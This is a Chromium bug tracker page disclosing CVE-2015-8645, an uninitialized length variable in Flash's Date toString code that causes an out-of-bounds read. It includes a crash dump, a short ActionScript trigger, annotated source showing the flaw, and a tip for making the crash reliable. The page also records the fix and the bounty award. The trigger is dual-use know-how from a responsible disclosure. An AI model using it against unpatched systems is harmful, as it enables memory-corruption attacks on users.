# Flash: Uninitialized variable in DateObject::_toString can cause memory corruption

| Field | Value |
|-------|-------|
| **Issue ID** | [40083247](https://issues.chromium.org/issues/40083247) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Platforms** | Windows |
| **CVE IDs** | CVE-2015-8645 |
| **Reporter** | ne...@nesk.kr |
| **Assignee** | na...@google.com |
| **Created** | 2015-11-21 |
| **Bounty** | $5,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36

Steps to reproduce the problem:

Run poc.swf, chrome will crash like below. I am *only* tested on Windows 7 x86.

-----------------------------------------------------------------------------------------------

ModLoad: 557f0000 5689b000   C:\Program Files\Google\Chrome\Application\46.0.2490.86\PepperFlash\pepflashplayer.dll
...
(11c8.12f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0023e814 ebx=000000ff ecx=00000000 edx=00240000 esi=02dde42a edi=02ddf008
eip=55860682 esp=0023e7f4 ebp=0023e830 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Google\Chrome\Application\46.0.2490.86\PepperFlash\pepflashplayer.dll - 
pepflashplayer!PPP_ShutdownBroker+0x6f48f:
55860682 0fb70a          movzx   ecx,word ptr [edx]       ds:0023:00240000=????
5:071> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0023e830 558759e2 0023e844 02471c10 02ddf008 pepflashplayer!PPP_ShutdownBroker+0x6f48f
0023ea48 5588521b 02471c10 00000001 0023eaa0 pepflashplayer!PPP_ShutdownBroker+0x847ef
0023ea68 55885022 02471c10 00000001 0023eaa0 pepflashplayer!PPP_ShutdownBroker+0x94028
0023eab8 55885855 02471ca0 00000000 0023eaf0 pepflashplayer!PPP_ShutdownBroker+0x93e2f
0023eadc 5588605c 00000000 0023eaf0 02f21af8 pepflashplayer!PPP_ShutdownBroker+0x94662
0023eb2c 558af068 02471ca0 00000000 02e08ef8 pepflashplayer!PPP_ShutdownBroker+0x94e69
0023eb78 558b8a75 0231b4c0 02dfd13c 00000000 pepflashplayer!PPP_ShutdownBroker+0xbde75
0023ed54 55885f3a 02471bb0 00000000 0023eddc pepflashplayer!PPP_ShutdownBroker+0xc7882
0023ed7c 5588513f 02471bb0 00000000 0023eddc pepflashplayer!PPP_ShutdownBroker+0x94d47
0023edcc 55860f9d 00000000 0023eddc 023b0f51 pepflashplayer!PPP_ShutdownBroker+0x93f4c
0023ede0 559f98ea 00000000 0023eec0 00000000 pepflashplayer!PPP_ShutdownBroker+0x6fdaa
0023ee9c 559fa045 0233a810 02315f60 00000001 pepflashplayer!PPP_ShutdownBroker+0x2086f7
0023ef4c 559fa59f 0233a810 02315f60 0023f050 pepflashplayer!PPP_ShutdownBroker+0x208e52
0023ef80 559f9b40 0233a810 00000000 00000008 pepflashplayer!PPP_ShutdownBroker+0x2093ac
0023f114 558e95e0 0233a810 000003fa 0023f164 pepflashplayer!PPP_ShutdownBroker+0x20894d
0023f150 558e5aa2 022fb18c 0230b000 022fb170 pepflashplayer!PPP_ShutdownBroker+0xf83ed
0023f218 75d2965e 00000000 7647c4fb 77ab62e0 pepflashplayer!PPP_ShutdownBroker+0xf48af
0023f22c 75d295c3 0023f244 0023f270 77ab634c KERNELBASE!GetSystemInfoInternal+0xb6
0023f27c 00000000 00000001 5591f566 0231a0a0 KERNELBASE!GetSystemInfo+0x3f
5:071> !address
...
*   240000   700000   4c0000 MEM_PRIVATE MEM_RESERVE                                    <unclassified> 

-----------------------------------------------------------------------------------------------

What is the expected behavior?

What went wrong?
The following code is a minimal test case for reproducing the bug(not crash).

-----------------------------------------------------------------------------------------------

public class iu extends Sprite{
	public function iu(){
		var poc:Date = new Date(0,0,Number.MAX_VALUE,0,0,0,0);
		poc.toString();   //toString, toTimeString, toUTCString ...
	}
}

-----------------------------------------------------------------------------------------------

The vulnerability exists in the DateObject::_toString() function.

-----------------------------------------------------------------------------------------------

    Stringp DateObject::_toString(int index)
    {
        wchar buffer[256];
        int len;										// Uninitialized !
        date.toString(buffer, index, len);				// what if toString() failed ?
        return core()->newStringUTF16(buffer, len);		// Does not care!
    }

-----------------------------------------------------------------------------------------------

As we can see in the source code, "len" is uninitialized.

This value is actually set in Date.toString() function inside.

-----------------------------------------------------------------------------------------------

  bool Date::toString(wchar *buffer,
                        int formatIndex, int &len) const
    {

...

        int month = MonthFromTime(time);
        int day = WeekDay(time);
        if (month < 0 || month >= 12 || day < 0 || day >= 7) {
            return false;						// return false; but no one cares about the &len;
        }

-----------------------------------------------------------------------------------------------

But if the Date() parameters are not appropriate, the function will return false and the "len" still remains uninitialized.

-----------------------------------------------------------------------------------------------

    Stringp AvmCore::newStringUTF16(const wchar* s, int len, bool strict)
    {
        return String::createUTF16(this, s, len, String::kDefaultWidth, false, strict);
    }

   // Create a string out of an UTF-16 buffer.
    Stringp String::createUTF16
        (AvmCore* core, const wchar* buffer, int32_t len, Width desiredWidth, bool staticBuf, bool strict)
    {
        if (buffer == NULL)
        {
            len = 0;
            buffer = &k_zero.u16;
            staticBuf = true;
        }
        if (len < 0)							                     // only check if (len < 0)
            len = Length(buffer);

        bool is7bit = false;
        int32_t stringLength = len;
        if (desiredWidth != k16)
        {
            // determine the string width to use
            StringWidths widths;
            if (!_analyzeUtf16(buffer, len, widths, strict))		// our crash happens here (OOB Read)
            {
                // TODO: bad character sequence error
                return NULL;
            }
...

        // found the width to use, now create that string
        Stringp s = createDynamic(core->GetGC(), NULL, stringLength, desiredWidth, is7bit);
                                                                    // stringLength == len, another bug?
        String::Pointers ptrs(s);
        if (desiredWidth == k8)
        {
            while (len-- > 0)
                *ptrs.p8++ = (char) *buffer++;
        }
        else
        {
            VMPI_memcpy(ptrs.pv, buffer, len << desiredWidth);		// len used as the size parameter of memcpy, possible bof
        }
        VERIFY_7BIT(s);
        return s;
    }

-----------------------------------------------------------------------------------------------

Finally, the "len" is passed as an argument of the String::createUTF16() function.

And the String::createUTF16() only checks whether the len is less than zero.

This results in memory corruption and crash.

In my case, assign a greater number of local variables (4000 times) could always lead to OOB.

Did this work before? N/A 

Chrome version: 46.0.2490.86  Channel: stable
OS Version: 6.1 (Windows 7, Windows Server 2008 R2)
Flash Version: Shockwave Flash 19.0 r0

## Attachments

- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)

## Timeline

### wf...@chromium.org (2015-11-22)

[Empty comment from Monorail migration]

### wf...@chromium.org (2015-11-22)

Can repro this as an uncontrolled READ on Chrome Stable 32-bit.

Symbolized crash is at https://paste.googleplex.com/5253918703484928?raw confirms it's inside _analyzeUtf16

natashenka can you take a look at this?

### na...@google.com (2015-11-23)

Nice bug, I've reported it to Adobe. Can you let me know what name you want to be credited as on the advisory, and if you want to apply a 90 day deadline?

### ne...@nesk.kr (2015-11-24)

Thanks, please use "Jaehun Jeong (@n3sk) of WINS, WSEC Analysis Team" for credit

### na...@google.com (2016-01-08)

This was fixed in the latest Flash update as CVE-2015-8645

### ti...@google.com (2016-01-08)

[Empty comment from Monorail migration]

### ti...@google.com (2016-02-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-04-16)

This security bug has been closed for more than 14 weeks. Removing view restrictions.

For more details visit https://sites.google.com/a/chromium.org/dev/issue-tracking/autotriage - Your friendly Sheriffbot

### ti...@google.com (2016-06-30)

Hello,

My apologies for the delay in rewarding this bug, but we took it to the reward panel last week and decided to reward you $5,000 for reporting this issue. Congratulations!

Our finance team should be in touch within 7 days to collect your payment details. If that doesn't happen, please contact me directly at timwillis@

Thanks for your report!

### aw...@chromium.org (2016-07-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-28)

This issue was migrated from crbug.com/chromium/559541?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083247)*
